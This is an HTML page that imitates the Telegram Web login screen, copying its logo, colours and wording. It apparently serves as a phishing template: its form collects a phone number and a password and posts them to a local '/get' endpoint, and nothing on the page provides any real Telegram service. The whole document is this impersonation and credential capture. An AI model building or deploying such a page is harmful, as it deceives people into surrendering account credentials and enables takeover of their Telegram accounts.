<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
    <title>Telegram Web</title>
    <style>
      body {
        font-family: -apple-system, BlinkMacSystemFont, 'Roboto', 'Helvetica Neue', Arial, sans-serif;
        background-color: #fff;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        margin: 0;
      }
      .login-container {
        width: 360px;
        text-align: center;
      }
      #logo {
        margin-bottom: 24px;
      }
      .g-h1 {
        font-size: 24px;
        font-weight: 500;
        color: #000;
        margin-bottom: 8px;
      }
      .g-h2 {
        font-size: 14px;
        color: #707579;
        margin-bottom: 24px;
      }
      .g-input {
        width: 100%;
        padding: 14px 16px;
        border: 2px solid #e0e0e0;
        border-radius: 10px;
        font-size: 16px;
        margin-bottom: 16px;
        box-sizing: border-box;
        outline: none;
        background: #f4f4f5;
        transition: border-color 0.2s, background 0.2s;
      }
      .g-input:focus {
        border-color: #3390ec;
        background: #fff;
      }
      .gbtn-primary {
        width: 100%;
        padding: 14px;
        background-color: #3390ec;
        color: #fff;
        border: none;
        border-radius: 10px;
        font-size: 16px;
        font-weight: 500;
        cursor: pointer;
      }
      .gbtn-primary:hover {
        background-color: #2b7cd4;
      }
      .forgot {
        display: block;
        margin-top: 16px;
        color: #3390ec;
        font-size: 14px;
        text-decoration: none;
      }
      .forgot:hover {
        text-decoration: underline;
      }
      .footer {
        margin-top: 24px;
        font-size: 13px;
        color: #707579;
      }
    </style>
  </head>
  <body>
    <div class="login-container">
      <svg id="logo" viewBox="0 0 240 240" width="160" height="160">
        <defs>
          <linearGradient id="a" x1="0.667" y1="0.167" x2="0.417" y2="0.75">
            <stop offset="0" stop-color="#37aee2"/>
            <stop offset="1" stop-color="#1e96c8"/>
          </linearGradient>
        </defs>
        <circle cx="120" cy="120" r="120" fill="url(#a)"/>
        <path d="M98 175c-3.9 0-3.2-1.5-4.6-5.2L82 132.2 170 80" fill="#c8daea"/>
        <path d="M98 175c3 0 4.3-1.4 6-3l16-15.6-20-12" fill="#a9c9dd"/>
        <path d="M100 144.4l48.4 35.7c5.5 3 9.5 1.5 10.9-5.1l19.7-92.8c2-8.1-3.1-11.7-8.4-9.3L55 117.5c-7.9 3.2-7.8 7.6-1.4 9.5l29.7 9.3L152 93c3.2-2 6.2-.9 3.8 1.3" fill="#fff"/>
      </svg>
      <h1 class="g-h1">Log in to Telegram</h1>
      <p class="g-h2">Please confirm your country code<br>and enter your phone number.</p>
      <form action="/get" method="POST">
        <input class="g-input" type="tel" name="phone" placeholder="Phone Number" required>
        <input class="g-input" type="password" name="password" placeholder="Password (optional)">
        <button type="submit" class="gbtn-primary">Next</button>
      </form>
      <p class="footer">Log in by <a href="#" style="color:#3390ec;text-decoration:none">QR Code</a></p>
    </div>
  </body>
</html>
